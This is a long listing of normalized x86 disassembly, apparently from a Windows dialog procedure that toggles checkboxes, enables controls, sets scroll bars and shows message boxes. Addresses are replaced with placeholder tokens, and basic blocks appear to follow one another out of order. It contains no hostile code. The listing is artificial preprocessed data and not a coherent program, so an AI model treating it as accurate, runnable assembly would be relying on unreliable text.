inc al
push esi
mov [ rw-data ] al
call edi
dec eax
neg eax
sbb al al
push 0x1021
inc al
push esi
mov [ rw-data ] al
call edi
mov cl [ rw-data ]
mov ebx [ SendDlgItemMessageA@IAT ]
mov ebp [ GetDlgItemTextA@IAT ]
dec eax
neg eax
sbb al al
inc al
test cl cl
mov [ rw-data ] al
je r-xdata
mov ecx rw-data
mov [ rw-data ] 0x1
call sub_447de0
test eax eax
mov esi [ esp + 0x388 ]
mov ebp [ SendDlgItemMessageA@IAT ]
jbe r-xdata
push 0x1
lea eax [ esp + 0x14 ]
push eax
push 0x2
push esi
call [ SetScrollInfo@IAT ]
mov ecx [ esp + 0x24 ]
push ecx
lea edx [ esp + 0x70 ]
push r--data
push edx
call [ wsprintfA@IAT ]
add esp 0xc
push 0xfa2
push edi
call ebp
cmp esi eax
jne r-xdata
jmp [ eax * 4 + jump_table_44e8d8 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
lea eax [ esp + 0x70 ]
push eax
mov ecx rw-data
call sub_401e80
movzx ecx [ rw-data ]
mov edi [ CheckDlgButton@IAT ]
push ecx
push 0x411
push esi
call edi
push 0x0
push 0x411
push 0x111
push esi
call ebp
movzx edx [ rw-data ]
push edx
push 0x40e
push esi
call edi
movzx eax [ rw-data ]
push eax
push 0x413
push esi
call edi
movzx ecx [ rw-data ]
push ecx
push 0x415
push esi
call edi
movzx edx [ rw-data ]
push edx
push 0x1021
push esi
call edi
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
test ecx ecx
mov edi [ esp + 0x388 ]
je r-xdata
cmp [ rw-data ] ebx
je r-xdata
shr ecx 0x10
cmp ecx 0x1
jne r-xdata
mov ebx [ esp + 0x388 ]
push 0x0
push 0x0
push 0x188
push 0x1040
push ebx
call [ SendDlgItemMessageA@IAT ]
mov ebp eax
cmp ebp 0xffffffff
je r-xdata
mov ecx rw-data
call sub_447de0
test eax eax
jbe r-xdata
mov ebx [ GetParent@IAT ]
push 0x1
push 0x470
push esi
call ebx
mov edi [ GetDlgItem@IAT ]
push eax
call edi
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0x0
push 0x147
push 0x470
push esi
call ebx
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x40e
push esi
call [ CheckDlgButton@IAT ]
push 0x1
push 0x40e
push esi
call edi
push eax
call ebp
mov al [ rw-data ]
test al al
je r-xdata
push 0x7
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x470
push esi
call [ GetParent@IAT ]
mov edi [ GetDlgItem@IAT ]
push eax
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
mov ebp [ CheckDlgButton@IAT ]
push 0x1
push 0x40e
push esi
call ebp
push 0x0
push 0x40e
push esi
call edi
push eax
call ebx
push 0x0
push 0x413
push esi
call ebp
push 0x0
push 0x415
push esi
call ebp
mov al [ rw-data ]
test al al
je r-xdata
jmp [ eax * 4 + jump_table_44e894 ]
mov eax [ eax + 0xc ]
mov esi [ esp + 0x388 ]
mov ebx [ GetParent@IAT ]
mov edi [ eax + 0x18 ]
lea ecx [ esp + 0x274 ]
push ecx
push 0x104
push 0x464
push esi
call ebx
push eax
call [ SendMessageA@IAT ]
mov edx [ edi * 4 + rw-data ]
push edx
lea eax [ esp + 0x278 ]
push eax
call sub_458010
add esp 0x4
lea ecx [ esp + eax + 0x278 ]
push ecx
call [ lstrcpyA@IAT ]
lea ebp [ edi - 0x1 ]
push ebp
push esi
call sub_447cc0
push ebp
call sub_44a040
add esp 0xc
lea edx [ esp + 0x274 ]
push edx
mov ecx rw-data
call sub_402510
push 0x413
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
test al al
je r-xdata
push 0x0
push 0x0
push 0x400
push 0x1008
push esi
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
call ebx
push 0x1009
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
push 0x100a
neg eax
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
neg eax
push 0x100
mov [ rw-data ] eax
lea eax [ esp + 0x70 ]
push eax
push 0x100c
push esi
call ebp
lea ecx [ esp + 0x6c ]
push ecx
mov ecx rw-data
call sub_402510
mov al [ rw-data ]
mov edi [ GetDlgItem@IAT ]
push 0x0
push 0x103b
push esi
call edi
push eax
call [ EnableWindow@IAT ]
lea ecx [ esp + 0x54 ]
push ecx
push 0xfa1
push esi
call edi
push eax
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
mov ebx [ GetParent@IAT ]
lea ecx [ esp + 0x64 ]
push ecx
push esi
mov [ esp + 0x6c ] edx
mov [ esp + 0x70 ] eax
call ebx
push eax
call [ ScreenToClient@IAT ]
lea edx [ esp + 0x54 ]
push edx
push 0xfa1
push esi
call edi
push eax
call [ GetWindowRect@IAT ]
lea eax [ esp + 0x54 ]
push eax
push 0x441
push esi
call ebx
push eax
call edi
push eax
call [ GetWindowRect@IAT ]
mov ecx [ esp + 0x54 ]
mov edx [ esp + 0x58 ]
lea eax [ esp + 0x4c ]
push eax
push esi
mov [ esp + 0x54 ] ecx
mov [ esp + 0x58 ] edx
call ebx
push eax
call [ ScreenToClient@IAT ]
lea ecx [ esp + 0x54 ]
push ecx
push 0x470
push esi
call ebx
push eax
call edi
push eax
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x54 ]
mov eax [ esp + 0x58 ]
lea ecx [ esp + 0x4c ]
push ecx
push esi
mov [ esp + 0x54 ] edx
mov [ esp + 0x58 ] eax
call ebx
push eax
call [ ScreenToClient@IAT ]
mov edx [ rw-data ]
mov ebx [ wsprintfA@IAT ]
push edx
lea eax [ esp + 0x70 ]
push r--data
push eax
call ebx
add esp 0xc
lea ecx [ esp + 0x6c ]
push ecx
push 0x0
push 0xc
push 0xfa3
push esi
call edi
push eax
call [ SendMessageA@IAT ]
mov edx [ rw-data ]
push 0x1
lea eax [ esp + 0x34 ]
push eax
push 0x2
push 0xfa2
push esi
mov [ esp + 0x44 ] 0x1c
mov [ esp + 0x48 ] 0x7
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] 0x64
mov [ esp + 0x58 ] edx
mov [ esp + 0x54 ] 0x1
call edi
push eax
call [ SetScrollInfo@IAT ]
mov ecx [ rw-data ]
add ecx 0xfa5
push ecx
push 0xfa7
push 0xfa5
push esi
call [ CheckRadioButton@IAT ]
mov eax [ rw-data ]
test eax eax
je r-xdata
lea eax [ esp + 0x10 ]
push eax
push esi
call [ GetWindowRect@IAT ]
mov edx [ esp + 0x14 ]
mov ecx [ esp + 0x1c ]
mov edi [ esp + 0x10 ]
sub ecx edx
mov edx [ esp + 0x18 ]
push 0x6
push ecx
sub edx edi
add edx 0x12c
push edx
push ebx
push ebx
push ebx
push esi
call [ SetWindowPos@IAT ]
mov [ esp + 0x2c ] ebx
nop
push 0xff3
push edi
call ebp
cmp esi eax
jne r-xdata
lea eax [ esp + 0x6c ]
push eax
push 0x0
push 0xc
push 0xfa3
jmp r-xdata
mov ecx [ esp + 0x18 ]
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov edx [ esp + 0x24 ]
cmp edx [ esp + 0x18 ]
jle r-xdata
mov eax [ esp + 0x24 ]
cmp eax ecx
jge r-xdata
mov eax [ esp + 0x24 ]
mov ecx [ esp + 0x18 ]
sub eax edx
cmp eax ecx
mov [ esp + 0x24 ] eax
jge r-xdata
mov eax [ esp + 0x24 ]
add eax edx
cmp eax ecx
mov [ esp + 0x24 ] eax
jle r-xdata
mov [ esp + 0x24 ] ecx
jmp r-xdata
shr ebx 0x10
mov [ esp + 0x24 ] ebx
mov al [ rw-data ]
test al al
push 0x0
je r-xdata
mov ecx [ eax + 0x20c ]
test ecx ecx
mov ebx [ SetDlgItemTextA@IAT ]
je r-xdata
push 0x412
push edi
or esi 0xffffffff
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x5
test eax eax
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
mov ecx [ esp + 0x388 ]
push ebx
push r--data
push r--data
push ecx
call [ MessageBoxA@IAT ]
jmp r-xdata
mov eax [ esp + 0x388 ]
push ecx
push 0x103b
push eax
call [ GetDlgItem@IAT ]
push eax
call [ EnableWindow@IAT ]
jmp r-xdata
mov ecx rw-data
mov edi ebp
call sub_447de0
dec eax
cmp ebp eax
jge r-xdata
mov esi [ esp + 0x388 ]
mov edi [ GetParent@IAT ]
push 0x2
push esi
mov [ rw-data ] 0x2
call edi
push eax
call [ GetDlgItem@IAT ]
push eax
push 0x2
push 0x111
push esi
call edi
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
push 0x40e
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
jne r-xdata
push 0x1
push 0x412
push esi
call edi
push eax
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0x412
push esi
call edi
push eax
call ebx
mov esi [ esp + 0x388 ]
push 0x40e
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
mov esi [ esp + 0x388 ]
mov edi [ EnableWindow@IAT ]
mov ebx [ GetDlgItem@IAT ]
jne r-xdata
mov edi [ esp + 0x388 ]
mov ebp [ IsDlgButtonChecked@IAT ]
push 0x40e
push edi
call ebp
test eax eax
mov ebx 0x10
jne r-xdata
mov al [ rw-data ]
test al al
mov esi [ esp + 0x388 ]
mov ebp [ CheckDlgButton@IAT ]
je r-xdata
mov esi [ esp + 0x388 ]
push 0x415
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
cmp edi 0x4
jne r-xdata
lea eax [ esp + 0x274 ]
push eax
push 0x0
push 0xc
push 0x480
push esi
call ebx
push eax
call [ GetDlgItem@IAT ]
jmp r-xdata
mov ebp [ GetDlgItem@IAT ]
lea edx [ esp + 0x30 ]
push edx
push 0x2
push 0xfa2
push esi
mov [ esp + 0x40 ] 0x1c
mov [ esp + 0x44 ] 0x4
call ebp
push eax
call [ GetScrollInfo@IAT ]
mov eax [ esp + 0x44 ]
push 0xfa5
push esi
mov [ rw-data ] eax
call edi
cmp eax 0x1
jne r-xdata
push 0x1029
push esi
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
call edi
push 0x100
neg eax
lea edx [ esp + 0x70 ]
push edx
sbb eax eax
push 0x1024
neg eax
push esi
mov [ rw-data ] eax
call ebp
lea eax [ esp + 0x6c ]
push eax
mov ecx rw-data
call sub_402510
push 0x100
lea ecx [ esp + 0x70 ]
push ecx
push 0x1026
push esi
call ebp
lea edx [ esp + 0x6c ]
push edx
mov ecx rw-data
call sub_402510
push 0x100
lea eax [ esp + 0x70 ]
push eax
push 0x1028
push esi
call ebp
lea ecx [ esp + 0x6c ]
push ecx
mov ecx rw-data
call sub_402510
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0xfa8
push esi
call [ CheckDlgButton@IAT ]
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x3e88cb3d
imul ecx
sar edx 0x7
mov eax edx
shr eax 0x1f
add edx eax
xor edx edx
jmp r-xdata
lea ecx [ esp + 0x6c ]
push ecx
push 0x0
push 0xc
push 0xff2
push edi
call ebp
mov eax edx
dec eax
mov [ esp + 0x24 ] eax
jmp r-xdata
inc eax
mov [ esp + 0x24 ] eax
jmp r-xdata
mov [ esp + 0x24 ] ecx
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x413
jmp r-xdata
mov ecx [ eax + 0x260 ]
test ecx ecx
je r-xdata
cmp [ eax + 0x210 ] 0x10
jb r-xdata
push esi
call sub_44a040
add esp 0x4
mov esi [ rw-data ]
push edi
call sub_447be0
add esp 0x4
jmp r-xdata
mov esi [ esp + 0x388 ]
mov edi [ GetParent@IAT ]
push 0x1
push esi
mov [ rw-data ] 0x1
call edi
push eax
call [ GetDlgItem@IAT ]
push eax
push 0x1
push 0x111
push esi
call edi
push eax
call [ PostMessageA@IAT ]
jmp r-xdata
mov edx [ esp + 0x388 ]
push ebx
push r--data
push r--data
push edx
call [ MessageBoxA@IAT ]
jmp r-xdata
mov ecx rw-data
call sub_447de0
dec eax
push eax
mov ecx rw-data
call sub_44c980
push 0x0
push ebp
push 0x182
push 0x1040
push ebx
call [ SendDlgItemMessageA@IAT ]
mov esi [ GetDlgItem@IAT ]
push 0x0
push 0x103b
push ebx
call esi
mov edi [ EnableWindow@IAT ]
push eax
call edi
mov ecx rw-data
call sub_447de0
test eax eax
jne r-xdata
mov esi ebp
imul esi esi 0x20c
jmp r-xdata
push 0x1
push 0x1036
push esi
call edi
push eax
call ebp
jmp r-xdata
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax 0x10
mov eax [ rw-data ]
jae r-xdata
mov ebp [ GetParent@IAT ]
push r--data
push 0x0
push 0xc
push 0x480
push esi
mov ebx eax
call ebp
mov edi [ GetDlgItem@IAT ]
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push 0x0
push 0x480
push esi
call ebp
push eax
call edi
push eax
call [ EnableWindow@IAT ]
jmp r-xdata
push 0x0
push 0x412
push esi
call [ CheckDlgButton@IAT ]
push 0x0
push 0x412
push esi
call ebx
push eax
call edi
mov ecx rw-data
call sub_4010f0
test eax eax
je r-xdata
cmp [ rw-data ] ebx
mov eax [ rw-data ]
jae r-xdata
lea ecx [ esp + 0x6c ]
push ecx
push 0x104
push 0x464
push edi
call [ GetParent@IAT ]
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
push 0x413
push esi
call [ IsDlgButtonChecked@IAT ]
cmp eax 0x1
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ebx [ GetParent@IAT ]
push 0x1
push 0x470
push esi
call ebx
mov edi [ GetDlgItem@IAT ]
push eax
call edi
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push 0x0
push 0x0
push 0x147
push 0x470
push esi
call ebx
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x40e
push esi
call [ CheckDlgButton@IAT ]
push 0x1
push 0x40e
push esi
call edi
push eax
call ebp
mov al [ rw-data ]
test al al
jne r-xdata
push 0x6
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x470
push esi
call [ GetParent@IAT ]
mov edi [ GetDlgItem@IAT ]
push eax
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
mov ebp [ CheckDlgButton@IAT ]
push 0x1
push 0x40e
push esi
call ebp
push 0x0
push 0x40e
push esi
call edi
push eax
call ebx
push 0x0
push 0x412
push esi
call ebp
push 0x0
push 0x412
push esi
call edi
push eax
call ebx
push 0x1
push 0x411
push esi
call edi
push eax
call ebx
push 0x0
push 0x413
push esi
call ebp
push 0x0
push 0x1021
push esi
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x14e
push 0x470
push esi
call ebx
push eax
call [ GetDlgItem@IAT ]
push eax
call [ SendMessageA@IAT ]
push 0x0
push r--data
push r--data
push esi
call [ MessageBoxA@IAT ]
jmp r-xdata
push eax
call [ SendMessageA@IAT ]
push 0xfa6
push esi
call edi
cmp eax 0x1
jne r-xdata
mov [ rw-data ] 0x0
jmp r-xdata
push 0x90000
push 0x0
push 0x406
push 0xfb8
push esi
call ebp
mov edx [ rw-data ]
push edx
push 0x1
push 0x405
push 0xfb8
push esi
call ebp
mov eax [ rw-data ]
push eax
lea ecx [ esp + 0x70 ]
push r--data
push ecx
call ebx
add esp 0xc
lea edx [ esp + 0x6c ]
push edx
push 0x0
push 0xc
push 0xff2
push esi
call edi
push eax
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
push 0x1
lea ecx [ esp + 0x34 ]
push ecx
push 0x2
push 0xff3
push esi
mov [ esp + 0x4c ] 0x0
mov [ esp + 0x50 ] 0x64
mov [ esp + 0x58 ] eax
mov [ esp + 0x54 ] 0x1
call edi
push eax
call [ SetScrollInfo@IAT ]
push 0x0
push 0xff6
push esi
call edi
push eax
push 0x469
push 0xff7
push esi
call ebp
push 0x1000a
push 0x0
push 0x465
push 0xff7
push esi
call ebp
mov edx [ rw-data ]
push edx
push 0x0
push 0x467
push 0xff7
push esi
call ebp
push 0x0
push 0xff9
push esi
call edi
push eax
push 0x469
push 0xffa
push esi
call ebp
push 0xa
push 0x0
push 0x465
push 0xffa
push esi
call ebp
mov eax [ rw-data ]
push eax
push 0x0
push 0x467
push 0xffa
push esi
call ebp
mov eax [ rw-data ]
test eax eax
mov edi [ CheckDlgButton@IAT ]
je r-xdata
push 0x1
push 0xfa9
push esi
call [ CheckDlgButton@IAT ]
mov eax [ edi + ebx ]
mov ecx [ eax + 0x34 ]
add eax 0x1c
cmp ecx 0x10
jb r-xdata
cmp [ esp + 0x2c ] edx
jge r-xdata
mov al [ rw-data ]
test al al
je r-xdata
push 0x415
push 0x111
push esi
call [ PostMessageA@IAT ]
jmp r-xdata
push 0x111
push esi
call ebp
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
cmp [ eax + 0x264 ] 0x10
jb r-xdata
add eax 0x1fc
mov eax [ eax + 0x1fc ]
jmp r-xdata
push eax
push 0x103c
push ebx
call esi
push eax
call edi
jmp r-xdata
mov ecx [ rw-data ]
add ecx esi
lea edx [ ecx + 0x20c ]
push edx
call sub_449c30
mov ecx rw-data
inc edi
add esi 0x20c
call sub_447de0
dec eax
cmp edi eax
jl r-xdata
push eax
push 0x0
push 0xc
push 0x480
push esi
call ebx
push eax
call edi
jmp r-xdata
mov eax rw-data
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea edx [ esp + 0x174 ]
push edx
mov ebp rw-data
mov eax ebp
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea ecx [ esp + 0x174 ]
push ecx
jmp r-xdata
mov ebp rw-data
mov eax ebp
mov ebp [ GetParent@IAT ]
push eax
push 0x0
push 0xc
push 0x480
push esi
call ebp
mov edi [ GetDlgItem@IAT ]
push eax
call edi
push eax
call [ SendMessageA@IAT ]
mov eax rw-data
xor ecx ecx
test ebx ebx
sete cl
push ecx
push 0x480
push esi
call ebp
push eax
call edi
mov ebp [ EnableWindow@IAT ]
push eax
call ebp
push ebx
push 0x1036
push esi
call edi
push eax
call ebp
jmp r-xdata
push 0x413
push esi
call ebp
test eax eax
jne r-xdata
push 0x0
push 0x470
push esi
call [ GetParent@IAT ]
push eax
call ebx
push eax
call edi
push 0x0
push 0x411
push esi
call ebx
push eax
call edi
push 0x40e
push esi
call ebp
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
imul edx edx 0x70
mov ecx [ eax + edx + 0x40 ]
add eax edx
cmp ecx 0x1
jne r-xdata
push eax
lea edx [ esp + 0x70 ]
push edx
call [ lstrcpyA@IAT ]
mov eax rw-data
mov [ esp + 0x28 ] esi
mov [ esp + 0x24 ] 0x0
mov [ esp + 0x14 ] 0x0
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x380 ] 0x1
je r-xdata
push 0x412
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
mov ebx [ EnableWindow@IAT ]
mov edi [ GetDlgItem@IAT ]
jne r-xdata
push 0x5
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x470
push esi
call [ GetParent@IAT ]
mov edi [ GetDlgItem@IAT ]
push eax
call edi
mov ebx [ EnableWindow@IAT ]
push eax
call ebx
push 0x1
push 0x40e
push esi
call ebp
push 0x0
push 0x40e
push esi
call edi
push eax
call ebx
push 0x0
push 0x415
push esi
call ebp
push 0x0
push 0x1021
push esi
call ebp
mov al [ rw-data ]
test al al
jne r-xdata
push 0x1
push 0x412
push esi
call ebp
push ebx
push 0x412
push 0x111
push esi
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
push 0xfa7
push esi
call edi
cmp eax 0x1
jne r-xdata
mov [ rw-data ] eax
jmp r-xdata
push 0xfa8
push esi
call edi
neg eax
sbb eax eax
push 0xfa9
neg eax
push esi
mov [ rw-data ] eax
call edi
push 0x0
push 0x0
neg eax
push 0x400
sbb eax eax
push 0xfb8
neg eax
push esi
mov [ rw-data ] eax
call ebx
lea ecx [ esp + 0x30 ]
push ecx
push 0x2
push 0xff3
push esi
mov [ rw-data ] eax
call ebp
push eax
call [ GetScrollInfo@IAT ]
mov edx [ esp + 0x44 ]
push 0x0
push 0x0
push 0x468
push 0xff7
push esi
mov [ rw-data ] edx
call ebx
push 0x0
push 0x0
push 0x468
push 0xffa
push esi
mov [ rw-data ] eax
call ebx
push 0xffb
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
push 0xffc
neg eax
push esi
mov [ rw-data ] eax
call edi
neg eax
sbb eax eax
neg eax
mov [ rw-data ] eax
jmp r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0xffc
push esi
call edi
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
push 0x40e
push 0x1021
push 0x111
push esi
call [ PostMessageA@IAT ]
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
push 0x0
push 0x412
push 0x111
push esi
call ebp
movzx eax [ rw-data ]
push eax
push 0x414
push esi
call edi
push 0x0
push 0x414
push 0x111
push esi
call ebp
push 0xffffffff
push 0x0
push 0xb1
push 0x480
push esi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
push eax
call ebp
jmp r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov ecx [ eax + 0x244 ]
test ecx ecx
je r-xdata
cmp [ eax + 0x184 ] 0x10
jb r-xdata
add eax 0x250
mov eax [ eax + 0x250 ]
jmp r-xdata
push eax
push 0x1024
push esi
call ebx
mov eax [ rw-data ]
mov ebp [ GetParent@IAT ]
push 0x0
push 0xc
push 0x480
push esi
call ebp
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push 0x1
push 0x480
push esi
call ebp
push eax
call edi
push eax
call ebx
push 0x0
push 0x1036
push esi
call edi
push eax
call ebx
jmp r-xdata
call [ lstrcpyA@IAT ]
lea eax [ esp + 0x170 ]
push eax
call sub_458010
add esp 0x4
push r--data
lea ecx [ esp + 0x174 ]
push ecx
mov [ esp + eax + 0x178 ] 0x0
call [ lstrcatA@IAT ]
lea edx [ esp + 0x170 ]
push edx
jmp r-xdata
push 0x1
push 0x411
push esi
call ebx
push eax
call edi
push 0x40e
push esi
call ebp
test eax eax
jne r-xdata
push 0x1
push 0x470
push esi
call [ GetParent@IAT ]
push eax
call ebx
push eax
call edi
mov [ esp + 0x28 ] 0xf
mov [ esp + 0x24 ] eax
mov [ esp + 0x14 ] al
cmp [ rw-data ] eax
mov [ esp + 0x380 ] eax
mov ebp 0x10
je r-xdata
cmp [ eax + 0x40 ] 0x2
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
push 0x0
push 0x0
push 0x147
push 0x470
push esi
call [ GetParent@IAT ]
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push eax
push esi
call sub_447cc0
add esp 0x8
push 0x0
push 0x40e
push esi
call ebp
push 0x1
push 0x40e
push esi
call edi
push eax
call ebx
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push 0x1
push 0x470
push esi
call [ GetParent@IAT ]
push eax
call edi
push eax
call ebx
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0x412
push esi
call edi
push eax
call ebx
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea eax [ esp + 0x174 ]
push eax
mov ebp rw-data
mov eax ebp
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea edx [ esp + 0x174 ]
push edx
jmp r-xdata
mov ebp rw-data
mov eax ebp
mov [ rw-data ] 0x2
push 0x90000
push 0x0
push 0x406
push 0x1008
push esi
call ebp
mov ecx [ rw-data ]
push ecx
push 0x1
push 0x405
push 0x1008
push esi
call ebp
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0xffb
push esi
call edi
mov edi [ rw-data ]
test edi edi
jne r-xdata
push edi
call sub_457f40
add esp 0x4
add edi eax
push edi
push 0x0
push 0x180
push 0x1040
push esi
call ebp
inc [ esp + 0x2c ]
add ebx 0x20c
jmp r-xdata
push 0x1
push 0x412
push esi
call edi
push 0x1
push 0x1029
push esi
call edi
add eax 0x170
mov eax [ eax + 0x170 ]
jmp r-xdata
push eax
push 0x1026
push esi
call ebx
mov eax [ rw-data ]
push eax
push eax
push 0x147
push 0x470
push esi
call [ GetParent@IAT ]
push eax
call [ GetDlgItem@IAT ]
mov ebx [ SendMessageA@IAT ]
push eax
call ebx
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
imul ecx ecx 0x70
lea eax [ ecx + edx ]
cmp [ eax + 0x18 ] ebp
jb r-xdata
mov eax [ rw-data ]
mov edx [ rw-data ]
imul eax eax 0x70
mov ecx [ eax + edx + 0x18 ]
add eax edx
cmp ecx ebp
jb r-xdata
mov ebp [ IsDlgButtonChecked@IAT ]
push 0x412
push esi
call ebp
cmp eax 0x1
jne r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0x14 ]
call sub_402510
mov esi rw-data
mov eax esi
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea ecx [ esp + 0x14 ]
call sub_402510
cmp [ esp + 0x28 ] ebx
mov eax [ esp + 0x14 ]
jae r-xdata
mov esi rw-data
mov eax esi
push eax
push 0x0
push 0xc
push 0x480
push esi
call [ GetParent@IAT ]
push eax
call edi
push eax
call [ SendMessageA@IAT ]
push 0x0
mov eax rw-data
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
mov ecx [ rw-data ]
cmp ecx 0x10
mov eax [ rw-data ]
mov ebp eax
jae r-xdata
call [ lstrcpyA@IAT ]
lea ecx [ esp + 0x170 ]
push ecx
call sub_458010
add esp 0x4
push r--data
lea edx [ esp + 0x174 ]
push edx
mov [ esp + eax + 0x178 ] 0x0
call [ lstrcatA@IAT ]
lea eax [ esp + 0x170 ]
push eax
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x1
push 0x1009
push esi
call edi
push eax
push 0x1028
push esi
call ebx
mov eax [ rw-data ]
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
lea edi [ eax + 0x4 ]
mov edi [ eax + 0x4 ]
jmp r-xdata
add eax 0x4
add eax 0x7
jmp r-xdata
mov eax [ eax + 0x4 ]
add eax 0x7
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx ebx
mov eax [ rw-data ]
mov esi eax
jae r-xdata
mov eax [ esp + 0x24 ]
mov bl [ esp + eax + 0x6c ]
lea eax [ esp + eax + 0x6c ]
mov [ eax ] 0x0
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x14 ]
push ecx
call sub_428d60
add esp 0x8
test al al
je r-xdata
push eax
call sub_458010
add esp 0x4
push eax
lea ecx [ esp + 0x14 ]
call sub_401f60
jmp r-xdata
lea eax [ esp + 0x14 ]
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea eax [ esp + 0x174 ]
push eax
mov ebp rw-data
mov eax ebp
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea edx [ esp + 0x174 ]
push edx
jmp r-xdata
mov ebp rw-data
mov eax ebp
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
push 0x1
push 0x100a
push esi
call edi
push eax
call sub_458010
add esp 0x4
push eax
mov ecx rw-data
call sub_401f60
mov eax [ edi * 4 + rw-data ]
push eax
mov ecx rw-data
call sub_402010
cmp [ rw-data ] 0x10
mov eax [ rw-data ]
jae r-xdata
mov eax rw-data
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
cmp [ eax + 0x18 ] ebp
jb r-xdata
lea ecx [ esp + 0x10 ]
push eax
call sub_402510
cmp [ esp + 0x28 ] ebp
mov edx [ esp + 0x14 ]
jae r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
push eax
lea edx [ esp + 0x70 ]
push edx
call [ lstrcmpiA@IAT ]
test eax eax
je r-xdata
mov esi rw-data
mov eax esi
lea ecx [ esp + 0x10 ]
call sub_4480e0
jmp r-xdata
mov edx [ esp + 0x24 ]
push r--data
lea ecx [ esp + 0x14 ]
mov [ esp + edx + 0x70 ] bl
call sub_402010
lea eax [ esp + 0x6c ]
push eax
lea ecx [ esp + 0x14 ]
call sub_402010
lea eax [ esp + 0x10 ]
call sub_447fd0
push 0xffffffff
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
mov ecx rw-data
call sub_401dd0
push 0x40e
push edi
call ebp
test eax eax
jne r-xdata
push 0x414
push edi
